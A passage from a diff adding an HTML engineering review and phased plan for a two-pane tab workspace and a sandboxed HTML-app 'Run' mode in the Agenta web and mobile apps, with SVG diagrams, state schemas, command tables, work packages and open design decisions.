+      <line x1="766" y1="78" x2="796" y2="78" stroke="currentColor" marker-end="url(#arw3)"/>
+      <rect x="796" y="60" width="130" height="36" rx="4" fill="currentColor" opacity=".08"/>
+      <text x="861" y="77" font-size="11" text-anchor="middle" fill="currentColor" font-family="IBM Plex Mono, monospace">mount:9c/todo.html</text>
+      <text x="861" y="90" font-size="10" text-anchor="middle" fill="currentColor" opacity=".6">resource, drive-bound</text>
+      <rect x="636" y="116" width="130" height="36" rx="4" fill="currentColor" opacity=".08"/>
+      <text x="701" y="133" font-size="11" text-anchor="middle" fill="currentColor" font-family="IBM Plex Mono, monospace">tab: t_a10</text>
+      <text x="701" y="146" font-size="10" text-anchor="middle" fill="currentColor" opacity=".6">kind=session · pane A</text>
+      <line x1="766" y1="134" x2="796" y2="134" stroke="currentColor" marker-end="url(#arw3)"/>
+      <rect x="796" y="116" width="130" height="36" rx="4" fill="currentColor" opacity=".08"/>
+      <text x="861" y="133" font-size="11" text-anchor="middle" fill="currentColor" font-family="IBM Plex Mono, monospace">session:s_41</text>
+      <text x="861" y="146" font-size="10" text-anchor="middle" fill="currentColor" opacity=".6">has a live Chat in registry</text>
+      <text x="636" y="184" font-size="11" fill="currentColor" opacity=".75">move(tab) rewrites pane lists only.</text>
+      <text x="636" y="202" font-size="11" fill="currentColor" opacity=".75">It never calls closeSession, which drops the runtime</text>
+      <text x="636" y="220" font-size="11" fill="currentColor" opacity=".75">and cancels a run today.</text>
+    </svg>
+    <figcaption>The RFC's ownership split, mapped to the atoms and modules that already exist. The only new layer is the top one.</figcaption>
+  </figure>
+
+  <h3>Findings</h3>
+  <div class="finding"><span class="sev c">1</span><div><b>The mobile host is named but not analyzed, and it is the target app.</b><p>The RFC's last open question asks where the workspace should live "so desktop changes preserve the mobile host", but its source entry points list only oss files. Mobile's <code>SessionWorkspace.tsx</code> landed on 8 Aug, a month before the RFC's pinned commit, and already used the same files pane and pane atoms. The answer to the open question has to be a package. <code>/m</code> already has <code>SessionWorkspace.tsx</code> on the same <code>SplitPane</code> with the same pane atoms and a tested <code>resolveSessionPanes</code> rule for phone widths. <strong>Any desktop-only implementation is debt on arrival.</strong> Build the workspace state and tab host in a package and mount it from both.</p></div></div>
+  <div class="finding"><span class="sev c">2</span><div><b>Sessions in both panes is the expensive part. Defer it to v2.</b><p><code>activeSessionIdAtomFamily(scope)</code> feeds shortcuts, hydration, composer focus, the URL <code>?session_id=</code> sync, the files pane and onboarding. Letting a session live in pane B means replacing that one atom with "selected per pane, focused pane, visible set, running set" across every consumer. <strong>v1: pane A keeps today's session tabs unchanged; pane B accepts file, explorer and app tabs only.</strong> That delivers the whole HTML-app story and the "discuss a document while viewing it" story with none of the identity rework.</p></div></div>
+  <div class="finding"><span class="sev w">3</span><div><b>Do not merge the mockup source.</b><p>It is a standalone Vite app with a 2,694-line <code>package-lock.json</code>, native drag-and-drop, and relative imports five directories up into <code>agenta-ui</code>. CodeRabbit's three findings (empty active tab after merging panes, <code>openOther</code> leaving pane 1 empty, composer focus ring removed) are real but only matter if the code is meant to live. Keep the hosted link and the two PNGs in the README; delete <code>mockup/src</code>, the lockfile and the build config from the PR.</p></div></div>
+  <div class="finding"><span class="sev w">4</span><div><b>Keep "close a running tab = Stop" in v1.</b><p>The PRD's proposal 6 reverses a deliberate decision (<code>shouldCancelRunOnClose</code>). It only makes sense once a session can have more than one view, which v1 does not allow. Revisit with duplicate views.</p></div></div>
+  <div class="finding"><span class="sev i">5</span><div><b>The one-pane merge rule needs a spec, not a fix.</b><p>CodeRabbit found the mockup selects an empty tab when collapsing to one pane. Specify it: merged order is pane A then pane B; selected tab is the focused pane's selection, else the other pane's, else the first tab.</p></div></div>
+  <div class="finding"><span class="sev i">6</span><div><b>Explorer tabs bind to a drive, and say which.</b><p>Today the Files pane follows the active session. In the workspace an explorer tab is pinned to the drive it was opened from and shows the session name in its title. "Follow focus" is an explicit later toggle, as the PRD says. The existing per-session openers (file card, chat link, staged drop) route through the workspace's <code>open(resource, preferredPane)</code> command instead of latching the pane flag.</p></div></div>
+  <div class="finding"><span class="sev i">7</span><div><b>Library call: generic two-pane on the kit, no Dockview.</b><p>Agreed with the RFC. Add <code>@dnd-kit/core</code> + <code>sortable</code> to the package (they are desktop-only deps today), keep the move-to-other-pane menu action as the keyboard path, and reuse the tab strip patterns from <code>SessionTabStrip</code>. Two panes is the product limit; nothing in the state shape should assume it, but nothing should build for N either.</p></div></div>
+</section>
+
+<section id="arch">
+  <h2>Architecture</h2>
+  <p>Where each piece lives, what the persisted state looks like, and how the workspace commands behave. The rule throughout: packages hold the logic and the UI, and the two hosts only mount them.</p>
+
+  <h3>Packages and hosts</h3>
+  <figure>
+    <svg viewBox="0 0 960 330" role="img" aria-label="Two hosts, desktop AgentChatPanel and mobile SessionWorkspace, both mount the new workspace package and the existing chat state atoms. The workspace package renders tab kinds through entity-ui drive components, which use the entities drive layer, where the new bridge and host modules sit, backed by the Fern mounts client.">
+      <defs>
+        <marker id="arw7" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="8" markerHeight="8" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="currentColor"/></marker>
+      </defs>
+      <g font-size="12" fill="currentColor">
+        <text x="20" y="16" font-size="11" letter-spacing=".08em" opacity=".6" font-weight="600">HOSTS · mount only</text>
+        <rect x="20" y="24" width="440" height="56" rx="6" fill="none" stroke="currentColor"/>
+        <text x="36" y="46" font-weight="600">Desktop · web/oss</text>
+        <text x="36" y="66" font-family="IBM Plex Mono, monospace" font-size="11" opacity=".8">AgentChatSlice/AgentChatPanel.tsx</text>
+        <rect x="500" y="24" width="440" height="56" rx="6" fill="none" stroke="currentColor"/>
+        <text x="516" y="46" font-weight="600">Mobile · web/mobile (target app)</text>
+        <text x="516" y="66" font-family="IBM Plex Mono, monospace" font-size="11" opacity=".8">features/chat/SessionWorkspace.tsx · sessionPanes.ts</text>
+
+        <text x="20" y="118" font-size="11" letter-spacing=".08em" opacity=".6" font-weight="600">PACKAGES · logic + UI</text>
+        <rect x="20" y="126" width="290" height="70" rx="6" fill="var(--accent)" opacity=".15"/><rect x="20" y="126" width="290" height="70" rx="6" fill="none" stroke="var(--accent)" stroke-width="1.5"/>
+        <text x="36" y="148" font-weight="600">@agenta/workspace</text><text x="230" y="148" font-size="10" fill="var(--accent)" font-weight="600">NEW</text>
+        <text x="36" y="166" font-size="11" opacity=".8">state: panes, tabs, commands, persistence</text>
+        <text x="36" y="182" font-size="11" opacity=".8">ui: tab host, strip, dnd, renderer registry</text>
+
+        <rect x="335" y="126" width="290" height="70" rx="6" fill="none" stroke="currentColor"/>
+        <text x="351" y="148" font-weight="600">@agenta/entity-ui/drive</text>
+        <text x="351" y="166" font-size="11" opacity=".8">renderers.tsx: Preview · Source · <tspan fill="var(--accent)" font-weight="600">Run</tspan></text>
+        <text x="351" y="182" font-size="11" opacity=".8">DriveExplorer · DriveFileContentViewer</text>
+
+        <rect x="650" y="126" width="290" height="70" rx="6" fill="none" stroke="currentColor"/>
+        <text x="666" y="148" font-weight="600">@agenta/chat/state</text>
+        <text x="666" y="166" font-size="11" opacity=".8">chatPanelMaximizedAtom · configPanelCollapsedAtom</text>
+        <text x="666" y="182" font-size="11" opacity=".8">filesPaneWidthAtom (already shared)</text>
+
+        <rect x="335" y="236" width="290" height="70" rx="6" fill="none" stroke="currentColor"/>
+        <text x="351" y="258" font-weight="600">@agenta/entities/drive</text>
+        <text x="351" y="276" font-size="11" opacity=".8"><tspan fill="var(--accent)" font-weight="600">htmlAppBridge.ts · htmlAppHost.ts</tspan> (new)</text>
+        <text x="351" y="292" font-size="11" opacity=".8">driveMedia.ts · drive queries · generation</text>
+
+        <rect x="650" y="236" width="290" height="70" rx="6" fill="none" stroke="currentColor"/>
+        <text x="666" y="258" font-weight="600">@agenta/api-client</text>
+        <text x="666" y="276" font-size="11" opacity=".8">Fern mounts: getMountFiles · writeMountFile</text>
+        <text x="666" y="292" font-size="11" opacity=".8">deleteMountFile</text>
+      </g>
+      <g font-size="11" fill="currentColor">
+        <line x1="165" y1="80" x2="165" y2="126" stroke="currentColor" marker-end="url(#arw7)"/>
+        <path d="M600 80 C 600 100, 330 100, 300 126" fill="none" stroke="currentColor" marker-end="url(#arw7)"/>
+        <text x="235" y="110" text-anchor="middle">mount pane B</text>
+        <line x1="795" y1="80" x2="795" y2="126" stroke="currentColor" marker-end="url(#arw7)"/>
+        <path d="M400 80 C 400 100, 700 100, 720 126" fill="none" stroke="currentColor" marker-end="url(#arw7)"/>
+        <text x="560" y="110" text-anchor="middle">pane geometry</text>
+        <line x1="310" y1="161" x2="335" y2="161" stroke="currentColor" marker-end="url(#arw7)"/>
+        <text x="322" y="153" text-anchor="middle" font-size="10">kinds</text>
+        <line x1="480" y1="196" x2="480" y2="236" stroke="currentColor" marker-end="url(#arw7)"/>
+        <text x="540" y="220" text-anchor="middle">bridge host · file text</text>
+        <line x1="625" y1="271" x2="650" y2="271" stroke="currentColor" marker-end="url(#arw7)"/>
+      </g>
+      <text x="480" y="324" font-size="11" text-anchor="middle" fill="currentColor" opacity=".7">Green is new. Everything else exists on main today.</text>
+    </svg>
+    <figcaption>The dependency direction never points into a host. Desktop and mobile differ only in the frame around pane B and in the phone rule that lets a pane replace the conversation.</figcaption>
+  </figure>
+
+  <h3>Persisted workspace state</h3>
+  <p>One atom per chat scope key, stored like today's session tabs. It holds references, never content. Version it from the first commit so a later shape change can migrate instead of resetting.</p>
+  <div class="tbl"><pre><code>// atomWithStorage(`workspace:${scope}`)
+{
+  version: 1,
+  panes: [
+    { tabs: ["t_a10", "t_a11"], selected: "t_a10" },   // pane A: sessions (v1: sessions only here)
+    { tabs: ["t_8f2", "t_8f3"], selected: "t_8f2" }    // pane B: file · explorer · app
+  ],
+  focused: 0,
+  tabs: {
+    "t_a10": { kind: "session",  ref: { sessionId: "s_41" } },
+    "t_8f2": { kind: "app",      ref: { mountId: "9c…", path: "apps/todo.html", sessionId: "s_41" } },
+    "t_8f3": { kind: "explorer", ref: { mountId: "9c…", sessionId: "s_41" } }
+  }
+}</code></pre></div>
+  <div class="tbl"><table>
+    <thead><tr><th>Kind</th><th>Resource ref</th><th>Identity rule</th><th>View state kept on move</th></tr></thead>
+    <tbody>
+      <tr><td><code>session</code></td><td><code>sessionId</code></td><td>One tab per session in v1; opening again focuses it</td><td>Draft, scroll, live Chat (registry, untouched)</td></tr>
+      <tr><td><code>file</code></td><td><code>mountId + path</code> (+ <code>sessionId</code> for the title)</td><td>Same mount and path is the same tab</td><td>Selected segment (Preview / Source), scroll</td></tr>
+      <tr><td><code>explorer</code></td><td><code>mountId</code> (+ <code>sessionId</code>)</td><td>One explorer per drive</td><td>Expanded folders, selected path</td></tr>
+      <tr><td><code>app</code></td><td><code>mountId + path</code></td><td>Same as file; a file tab switched to Run becomes an app tab</td><td>Grant, keyed by folder (memory + sessionStorage); iframe state is lost, app state is in files</td></tr>
+    </tbody>
+  </table></div>
+  <p class="small">Not persisted, ever: grants, message content, drafts, drive listings, iframe documents, pane widths mid-drag. Widths persist through the existing <code>filesPaneWidthAtom</code> after the drag ends.</p>
+
+  <h3>Commands</h3>
+  <figure>
+    <svg viewBox="0 0 960 250" role="img" aria-label="Flow for open(resource, preferredPane): look up the tab by resource identity; if it exists, select it and focus its pane; otherwise, if the layout has one pane and the kind is not session, add pane B; append the tab to the target pane, select it, focus the pane. Collapse merges pane A then pane B and selects the focused pane's selection, else the other pane's, else the first tab.">
+      <defs>
+        <marker id="arw8" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="8" markerHeight="8" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="currentColor"/></marker>
+      </defs>
+      <g font-size="12" fill="currentColor">
+        <text x="20" y="20" font-size="11" letter-spacing=".08em" opacity=".6" font-weight="600">open(resource, preferredPane)</text>
+        <rect x="20" y="34" width="150" height="44" rx="6" fill="none" stroke="currentColor"/>
+        <text x="95" y="60" text-anchor="middle">find tab by ref</text>
+        <path d="M95 56 m 145 0" fill="none"/>
+        <polygon points="260,34 340,56 260,78 180,56" fill="none" stroke="currentColor"/>
+        <text x="260" y="60" text-anchor="middle">exists?</text>
+        <rect x="400" y="20" width="200" height="40" rx="6" fill="var(--accent)" opacity=".15"/><rect x="400" y="20" width="200" height="40" rx="6" fill="none" stroke="var(--accent)"/>
+        <text x="500" y="44" text-anchor="middle">select it · focus its pane</text>
+        <polygon points="500,84 590,106 500,128 410,106" fill="none" stroke="currentColor"/>
+        <text x="500" y="102" text-anchor="middle" font-size="11">one pane and</text><text x="500" y="116" text-anchor="middle" font-size="11">kind ≠ session?</text>
+        <rect x="640" y="86" width="130" height="40" rx="6" fill="none" stroke="currentColor"/>
+        <text x="705" y="110" text-anchor="middle">add pane B</text>
+        <rect x="640" y="146" width="300" height="40" rx="6" fill="var(--accent)" opacity=".15"/><rect x="640" y="146" width="300" height="40" rx="6" fill="none" stroke="var(--accent)"/>
+        <text x="790" y="170" text-anchor="middle">append to target · select · focus target</text>
+      </g>
+      <g font-size="11" fill="currentColor">
+        <line x1="170" y1="56" x2="180" y2="56" stroke="currentColor" marker-end="url(#arw8)"/>
+        <line x1="340" y1="50" x2="400" y2="42" stroke="currentColor" marker-end="url(#arw8)"/><text x="368" y="36" text-anchor="middle">yes</text>
+        <path d="M340 62 C 380 70, 400 80, 440 96" fill="none" stroke="currentColor" marker-end="url(#arw8)"/><text x="380" y="90" text-anchor="middle">no</text>
+        <line x1="590" y1="106" x2="640" y2="106" stroke="currentColor" marker-end="url(#arw8)"/><text x="615" y="98" text-anchor="middle">yes</text>
+        <line x1="705" y1="126" x2="705" y2="146" stroke="currentColor" marker-end="url(#arw8)"/>
+        <path d="M500 128 C 500 166, 580 166, 640 166" fill="none" stroke="currentColor" marker-end="url(#arw8)"/><text x="540" y="150" text-anchor="middle">no</text>
+      </g>
+      <line x1="20" y1="206" x2="940" y2="206" stroke="currentColor" opacity=".25"/>
+      <g font-size="11" fill="currentColor">
+        <text x="20" y="226" font-weight="600">collapse()</text>
+        <text x="100" y="226">tabs = A ++ B · selected = focused.selected ?? other.selected ?? tabs[0] · focused = 0</text>
+        <text x="20" y="244" font-weight="600">move(tab, pane, before?)</text>
+        <text x="190" y="244">remove from source, insert in target, select, focus target. Never calls closeSession; never touches the Chat registry.</text>
+      </g>
+    </svg>
+    <figcaption>The two commands with branches. The mockup's two CodeRabbit bugs are the "exists?" branch in open and the fallback chain in collapse, both fixed here by specification.</figcaption>
+  </figure>
+
+  <div class="tbl"><table>
+    <thead><tr><th>Command</th><th>Layout effect</th><th>Resource effect</th></tr></thead>
+    <tbody>
+      <tr><td><code>open(ref, pane?)</code></td><td>Focus existing tab, or append and select</td><td>None. Kicks off the kind's query on mount</td></tr>
+      <tr><td><code>select(tab)</code></td><td>Selected tab in its pane, focus that pane</td><td>None</td></tr>
+      <tr><td><code>move(tab, pane, before?)</code></td><td>Rewrites both pane lists, selects in target</td><td>None. App tab: port closed on unmount, grant reused on remount</td></tr>
+      <tr><td><code>close(tab)</code></td><td>Drop from its pane, select neighbour</td><td><code>session</code>: today's close (stops a run). Other kinds: nothing</td></tr>
+      <tr><td><code>collapse()</code> / <code>split()</code></td><td>Merge per the rule above, or add an empty pane B</td><td>None</td></tr>
+      <tr><td><code>focus(pane)</code></td><td>Focused pane receives shortcuts and composer focus</td><td>None</td></tr>
+    </tbody>
+  </table></div>
+</section>
+
+<section id="plan">
+  <h2>The plan</h2>
+  <p>Four phases. Phase 1 and phase 2 have no dependency on each other and can run in parallel. Phase 3 is the app tab, which needs both. Phase 4 is the identity rework that lets sessions sit in either pane.</p>
+
+  <figure>
+    <svg viewBox="0 0 960 230" role="img" aria-label="Dependency graph: phase 0 decisions feeds phase 1 Run mode and phase 2 workspace with a non-session second pane, which run in parallel. Both feed phase 3, the app tab. Phase 2 also feeds phase 4, sessions in either pane.">
+      <defs>
+        <marker id="arw4" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="8" markerHeight="8" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="currentColor"/></marker>
+      </defs>
+      <g font-size="12" fill="currentColor">
+        <rect x="20" y="88" width="150" height="56" rx="6" fill="none" stroke="currentColor"/>
+        <text x="95" y="111" text-anchor="middle" font-weight="600">P0 · Decide</text>
+        <text x="95" y="129" text-anchor="middle" opacity=".7">merge docs · 8 calls</text>
+
+        <rect x="250" y="20" width="200" height="56" rx="6" fill="var(--accent)" opacity=".15"/>
+        <rect x="250" y="20" width="200" height="56" rx="6" fill="none" stroke="var(--accent)" stroke-width="1.5"/>
+        <text x="350" y="43" text-anchor="middle" font-weight="600">P1 · Run mode</text>
+        <text x="350" y="61" text-anchor="middle" opacity=".7">entity-ui → both hosts</text>
+
+        <rect x="250" y="156" width="200" height="56" rx="6" fill="var(--accent)" opacity=".15"/>
+        <rect x="250" y="156" width="200" height="56" rx="6" fill="none" stroke="var(--accent)" stroke-width="1.5"/>
+        <text x="350" y="179" text-anchor="middle" font-weight="600">P2 · Workspace v1</text>
+        <text x="350" y="197" text-anchor="middle" opacity=".7">pane B: file · explorer</text>
+
+        <rect x="540" y="88" width="180" height="56" rx="6" fill="none" stroke="currentColor"/>
+        <text x="630" y="111" text-anchor="middle" font-weight="600">P3 · App tab</text>
+        <text x="630" y="129" text-anchor="middle" opacity=".7">run beside the chat</text>
+
+        <rect x="770" y="156" width="170" height="56" rx="6" fill="none" stroke="currentColor" stroke-dasharray="5 4"/>
+        <text x="855" y="179" text-anchor="middle" font-weight="600">P4 · Sessions in B</text>
+        <text x="855" y="197" text-anchor="middle" opacity=".7">identity rework</text>
+      </g>
+      <path d="M170 110 C 210 110, 210 48, 250 48" fill="none" stroke="currentColor" marker-end="url(#arw4)"/>
+      <path d="M170 122 C 210 122, 210 184, 250 184" fill="none" stroke="currentColor" marker-end="url(#arw4)"/>
+      <path d="M450 48 C 500 48, 500 110, 540 110" fill="none" stroke="currentColor" marker-end="url(#arw4)"/>
+      <path d="M450 184 C 500 184, 500 122, 540 122" fill="none" stroke="currentColor" marker-end="url(#arw4)"/>
+      <path d="M450 196 C 600 196, 650 184, 770 184" fill="none" stroke="currentColor" stroke-dasharray="5 4" marker-end="url(#arw4)"/>
+      <text x="350" y="118" font-size="11" text-anchor="middle" fill="var(--accent)">in parallel</text>
+    </svg>
+    <figcaption>Green is where engineering starts. Phase 1 is useful on its own inside today's Files pane; phase 2 is useful on its own with static previews. Neither waits for the other.</figcaption>
+  </figure>
+
+  <div class="phases">
+    <div class="phase">
+      <div class="k">Phase 0 · this week</div>
+      <h3>Decide and merge the docs</h3>
+      <ul>
+        <li>Answer the decisions list below</li>
+        <li>#6529: apply amendments 1 to 8, merge</li>
+        <li>#6775: strip mockup source and lockfile, add the /m host and the v1 re-scope, merge</li>
+        <li>Open one Linear epic with the four phases</li>
+      </ul>
+      <div class="est">1 day · Arda + Mahmoud</div>
+    </div>
+    <div class="phase now">
+      <div class="k">Phase 1 · start now</div>
+      <h3>Run mode in the file viewer</h3>
+      <ul>
+        <li>Headless bridge + grant store + path scoping in <code>@agenta/entities/drive</code>, unit tested; <code>visible</code>, <code>changed</code>, <code>stat</code></li>
+        <li>Run segment, grant prompt, Refresh menu, access badge in <code>renderers.tsx</code>; same-folder scripts inlined; in-folder links navigate in place</li>
+        <li>MessageChannel port, CSP meta, tightened sandbox; ETag + <code>If-Match</code> in the API and the stub</li>
+        <li>agenta-apps skill, <code>create_app</code> with the board starter, kit tokens + <code>agenta-app.css</code> (creation C1 to C3); <code>.apps/</code> layout and <code>list_starters</code> (layout L1 to L3)</li>
+        <li>Feature flag; verified in desktop Files pane and /m sheet</li>
+      </ul>
+      <div class="est">Run mode 10 d + creation 6 d + layout 2.5 d · two engineers in parallel, about 2 weeks</div>
+    </div>
+    <div class="phase now">
+      <div class="k">Phase 2 · start now</div>
+      <h3>Workspace v1: second pane, non-session tabs</h3>
+      <ul>
+        <li>New package <code>@agenta/workspace</code>: layout atom, commands, persistence, renderer registry</li>
+        <li>Tab host UI on kit Tabs + SplitPane + dnd-kit, move via drag and menu</li>
+        <li>Desktop: <code>RightPanelSplit</code> + Files pane become pane B; openers route through <code>open()</code></li>
+        <li>Mobile: same pane B in <code>SessionWorkspace</code> at md+; phone falls back to the existing sheet</li>
+        <li>Kinds: file, explorer. Static HTML preview works here already</li>
+      </ul>
+      <div class="est">8 to 10 days · one engineer</div>
+    </div>
+    <div class="phase">
+      <div class="k">Phase 3 · after 1 and 2</div>
+      <h3>App tab</h3>
+      <ul>
+        <li>Kind <code>app</code>: a manifest folder opens as an App tile and a Run tab (creation C4)</li>
+        <li>Port closed on move or remount; the folder-keyed grant carries over, no re-prompt</li>
+        <li>Error relay in the Run tab, one-click send once <code>chat.draft</code> lands (C5)</li>
+        <li>Remaining starters: checklist, review-queue, form, sheet, dashboard (C6); canvas: library shelf, helper, whiteboard, chart, diagram</li>
+        <li>Browser QA on both hosts, light and dark</li>
+      </ul>
+      <div class="est">App tab 3 to 4 d · creation C4 to C6 8 d · canvas shelf + whiteboard 6 to 8 d</div>
+    </div>
+    <div class="phase">
+      <div class="k">Phase 4 · later</div>
+      <h3>Sessions in either pane</h3>
+      <ul>
+        <li>Replace active-session with selected-per-pane + focused pane + visible set</li>
+        <li>Shortcuts, hydration, URL sync, composer focus follow the focused pane</li>
+        <li>Registry callback ownership review before two views of one session</li>
+        <li>Revisit close-vs-stop</li>
+      </ul>
+      <div class="est">8 to 12 days · measure two streaming sessions first</div>
+    </div>
+  </div>
+</section>
+
+<section id="packages">
+  <h2>Work packages</h2>
+  <p>Each row is one PR-sized unit. Paths are where the change lands; both hosts inherit package work. <b>Every work package that adds or changes a component also adds or refreshes its Storybook stories</b> under <code>web/storybook/stories/entity-ui/</code> (or beside the component in its package), covering the states a reviewer cannot click into and both themes; the Storybook lint and build are part of the gate. The repo's <code>web/AGENTS.md</code> already requires this; the plan just names it per package.</p>
+
+  <h3>Phase 1 · Run mode</h3>
+  <div class="tbl"><table>
+    <thead><tr><th>#</th><th>Package</th><th>Lands in</th><th>Done when</th><th>Size</th></tr></thead>
+    <tbody>
+      <tr><td class="num">1.1</td><td>Bridge contract + stub script</td><td><code>@agenta/entities/src/drive/htmlAppBridge.ts</code></td><td><code>window.agenta</code> v1 typed; stub string exported; error codes enumerated; <code>agenta.visible</code> plus a <code>visibilitychange</code> event; a <code>changed</code> event carrying paths; <code>fs.stat(path)</code> → <code>{etag, mtime, size}</code>; unit tests for request/response matching and rejection paths</td><td class="num">1 d</td></tr>
+      <tr><td class="num">1.2</td><td>Path scoping + grant store</td><td>same module</td><td><code>resolveScoped(dir, path)</code> rejects traversal, absolute, and encoded dots; grant map keyed by mount+path, mirrored to sessionStorage; tests</td><td class="num">1 d</td></tr>
+      <tr><td class="num">1.3</td><td>Host handler on Fern mounts</td><td><code>@agenta/entities/src/drive/htmlAppHost.ts</code></td><td>read/list/exists/stat/write/remove mapped to <code>getMountFiles</code> / <code>writeMountFile</code> / <code>deleteMountFile</code>; caps 4 MB read, 1 MB write, <code>too_large</code>; drive generation bump on write; ETag cache per path, <code>If-Match</code> on write and remove, 412 → <code>conflict</code>; on a drive-generation bump not caused by this app, diff the folder listing and post <code>changed</code> with the paths</td><td class="num">2 d</td></tr>
+      <tr><td class="num">1.6</td><td>Conditional writes in the mounts API</td><td><code>api/oss/src/apis/fastapi/mounts</code>, <code>core/mounts</code>, <code>core/store/storage.py</code>, Fern regen</td><td><code>etag</code> on read and list responses; PUT and DELETE honour <code>If-Match</code> and <code>If-None-Match: *</code>, 412 with current ETag on mismatch; native conditional put where the store supports it, stat-compare-put fallback otherwise; tests for both paths</td><td class="num">2 d</td></tr>
+      <tr><td class="num">1.4</td><td>Run segment + grant prompt + assembler</td><td><code>@agenta/entity-ui/src/drive/renderers.tsx</code></td><td>Preview | Source | Run; grant sheet with Read / Read+write / Cancel; access badge; Refresh re-assembles; CSP meta injected; sandbox tightened; flag-gated. <b>Also, from the field test:</b> the Run assembler inlines same-folder <code>&lt;script src&gt;</code> files like it inlines CSS, and an in-folder link re-assembles the target in the same tab under the same grant. <b>Reserved surfaces:</b> Refresh is a menu with one item; the grant prompt has a hidden third section; the manifest parser accepts <code>refresh</code> and <code>tools</code> and ignores them</td><td class="num">3 d</td></tr>
+      <tr><td class="num">1.5</td><td>QA on both hosts</td><td>desktop Files pane, /m files sheet</td><td>Board template reads and writes <code>board.json</code>; agent reads the change next turn; read-only grant rejects writes with <code>read_only</code>; traversal rejected before any request</td><td class="num">1 d</td></tr>
+    </tbody>
+  </table></div>
+
+  <h3>Phase 2 · Workspace v1</h3>
+  <div class="tbl"><table>
+    <thead><tr><th>#</th><th>Package</th><th>Lands in</th><th>Done when</th><th>Size</th></tr></thead>
+    <tbody>
+      <tr><td class="num">2.1</td><td>Workspace state + commands</td><td>new <code>@agenta/workspace/src/state</code></td><td><code>workspaceAtomFamily(scope)</code> with panes, tab order, selected, focused; <code>open/select/move/close/collapse</code>; v1 schema in atomWithStorage; merge rule per finding 5; tests; a headless story-less package, but its commands are exercised by 2.2's stories</td><td class="num">2 d</td></tr>
+      <tr><td class="num">2.2</td><td>Renderer registry + tab host</td><td><code>@agenta/workspace/src/ui</code></td><td>kind → lazy view; tab strip on kit Tabs with status/title subscription; dnd-kit sortable across panes; move-to-other-pane menu; error + loading boundary per tab; <b>stories</b>: one pane, two panes, empty pane B, tab with error boundary tripped, tab loading, drag in progress, collapse merge result, narrow viewport, both themes</td><td class="num">3 d</td></tr>
+      <tr><td class="num">2.3</td><td>File + explorer kinds</td><td><code>@agenta/entity-ui/src/drive</code></td><td><code>DriveFileContentViewer</code> and <code>DriveExplorer</code> take stable <code>{mountId, path}</code> refs without <code>DriveSessionProvider</code>; explorer title shows its session; existing drive stories refreshed for the ref-based props</td><td class="num">1 d</td></tr>
+      <tr><td class="num">2.4</td><td>Desktop host</td><td><code>oss/…/AgentChatSlice/AgentChatPanel.tsx</code></td><td>Pane B replaces <code>RightPanelSplit</code> + <code>SessionFilesPane</code>; file card, chat link, context rail, inspector and staged-drop openers call <code>open()</code>; drawer scope and onboarding unchanged</td><td class="num">2 d</td></tr>
+      <tr><td class="num">2.5</td><td>Mobile host</td><td><code>mobile/src/features/chat/SessionWorkspace.tsx</code></td><td>Same pane B at md and wider; phone keeps the files sheet; <code>resolveSessionPanes</code> extended and tested</td><td class="num">1 d</td></tr>
+      <tr><td class="num">2.6</td><td>Perf gate</td><td>both hosts</td><td>Two streaming sessions + a file tab + repeated open/close: no leaked Chat instances, no leaked iframes, typing latency measured and recorded</td><td class="num">1 d</td></tr>
+    </tbody>
+  </table></div>
+
+  <h3>v1.1 · follow-ups that widen reach without widening the security surface</h3>
+  <div class="tbl"><table>
+    <thead><tr><th>#</th><th>Package</th><th>Lands in</th><th>Done when</th><th>Size</th></tr></thead>
+    <tbody>
+      <tr><td class="num">1.7</td><td><code>agenta.user</code>, <code>agenta.location</code> in the hello</td><td>stub + host</td><td>Display name and id; path and query after in-folder navigation; both documented in the contract</td><td class="num">0.5 d</td></tr>
+      <tr><td class="num">1.8</td><td><code>agenta.chat.draft(text)</code></td><td>host + the session composer</td><td>Parent writes a composer draft for the tab's session; the user still sends; refused when the tab has no session</td><td class="num">1 d</td></tr>
+      <tr><td class="num">1.9</td><td>Refresh menu: "Ask agent to refresh data" + schedule readout</td><td><code>renderers.tsx</code>, triggers query</td><td>Drafts the manifest's <code>refresh.prompt</code>; shows "next refresh" from a schedule bound to the app's folder</td><td class="num">1 d</td></tr>
+      <tr><td class="num">1.10</td><td>Asset preload</td><td>assembler</td><td>Manifest <code>assets</code> inlined as data URLs into <code>agenta.assets</code>; capped; missing files reported in the error strip</td><td class="num">1 d</td></tr>
+      <tr><td class="num">1.11</td><td>Error relay one-click send</td><td>stub + host</td><td>Depends on 1.8; the copy button becomes "Send to agent"</td><td class="num">0.5 d</td></tr>
+    </tbody>
+  </table></div>
+  <p class="small">Phase 1 is broken into parallel lanes with file ownership, contracts and an acceptance script in the <a href="phase1-run-mode.html">Run Mode Build Plan</a>. Creation work packages C1 to C7 and layout packages L1 to L7 are specified in their own documents; phase 1 includes C1 to C3 and L1 to L3, phase 3 includes C4 to C6 and L4 to L5. Canvas packages are in the canvas document.</p>
+
+  <div class="callout warn">
+    <p><strong>Package registration checklist.</strong> A new web package needs all four or it half-works: workspace glob (automatic), consumer <code>package.json</code> dep, <code>oss/next.config.ts</code> <code>transpilePackages</code>, and the Tailwind content glob in <code>oss/tailwind.config.ts</code> plus <code>@source</code> in <code>mobile/src/styles/globals.css</code>.</p>
+  </div>
+</section>
+
+<section id="decisions">
+  <h2>Decisions needed</h2>
+  <p>Mahmoud's questions, with a recommendation for each. Unblock phase 0 by confirming or overriding.</p>
+  <div class="dec">
+    <div class="row"><div class="q">Is <code>HtmlBody</code> the right boundary?</div><div class="a"><b>Yes.</b> Same iframe, same assembler, a third segment. A separate renderer would duplicate the asset inlining.</div></div>
+    <div class="row"><div class="q">Read-only first, or writes too?</div><div class="a"><b>Both, one grant prompt.</b> Writes are the product loop and the endpoint already exists behind <code>EDIT_MOUNTS</code>.</div></div>
+    <div class="row"><div class="q">Which mounts client methods?</div><div class="a"><b>Fern:</b> <code>getMountFiles</code> with <code>read=</code> for text and <code>path=</code> for list; <code>writeMountFile</code>; <code>deleteMountFile</code>. <code>exists</code> is a list of the parent filtered client-side.</div></div>
+    <div class="row"><div class="q">Grant lifetime?</div><div class="a"><b>Keyed by folder and access level, remembered per browser session.</b> Survives edits to the app. Never in workspace metadata or the persisted layout.</div></div>
